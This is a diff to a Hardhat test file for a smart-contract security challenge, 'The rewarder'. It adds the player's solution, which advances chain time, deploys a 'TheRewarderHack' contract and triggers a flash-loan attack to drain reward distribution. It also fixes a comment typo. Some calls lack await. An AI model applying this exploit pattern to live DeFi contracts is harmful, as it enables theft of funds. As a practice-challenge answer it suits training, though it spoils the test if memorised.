@@ -70,6 +70,15 @@ describe('[Challenge] The rewarder', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        // Advance the time by 5 days so that depositors can get rewards
+        await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]); // 5 days
+        const TheRewarderHackFactory = await ethers.getContractFactory('TheRewarderHack', player);
+        const rewardHack = await TheRewarderHackFactory.deploy(
+            player.address, flashLoanPool.address, rewarderPool.address, 
+            liquidityToken.address, rewardToken.address
+        );
+        const amount = liquidityToken.balanceOf(flashLoanPool.address);
+        rewardHack.connect(player).attack(amount);
     });
 
     after(async function () {
@@ -79,7 +88,7 @@ describe('[Challenge] The rewarder', function () {
             await rewarderPool.roundNumber()
         ).to.be.eq(3);
 
-        // Users should get neglegible rewards this round
+        // Users should get negligible rewards this round
         for (let i = 0; i < users.length; i++) {
             await rewarderPool.connect(users[i]).distributeRewards();
             const userRewards = await rewardToken.balanceOf(users[i].address);
